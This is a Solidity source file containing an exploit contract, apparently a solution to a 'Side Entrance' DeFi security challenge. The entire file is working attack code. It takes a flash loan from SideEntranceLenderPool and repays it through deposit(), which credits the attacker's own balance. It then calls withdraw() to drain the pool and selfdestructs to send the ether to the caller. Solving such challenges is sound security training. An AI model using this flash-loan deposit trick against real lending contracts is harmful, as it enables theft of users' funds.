// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { SideEntranceLenderPool } from "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {

    function attack(SideEntranceLenderPool victim, uint256 amount) external {
        victim.flashLoan(amount);
        victim.withdraw(); // drain the pool
        selfdestruct(payable(msg.sender));
    }

    function execute() external payable {
        // Repay the flash loan while increasing our balance
        SideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
    }

    receive() external payable {}

}
